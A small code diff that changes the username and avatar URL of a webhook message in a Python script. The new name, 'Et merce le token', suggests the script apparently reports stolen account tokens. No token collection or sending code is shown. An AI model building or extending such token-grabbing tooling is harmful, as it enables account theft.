@@ -190,8 +190,8 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Skidded",
-        "avatar_url": "https://i.pinimg.com/236x/4d/35/6f/4d356f4c3eb5d5e57e394175b83ca1fb.jpg"
+        "username": "Et merce le token",
+        "avatar_url": "https://vignette.wikia.nocookie.net/omniversal-battlefield/images/5/55/Bill_Cipher.jpg/revision/latest?cb=20170423231553"
     }
     try:
         
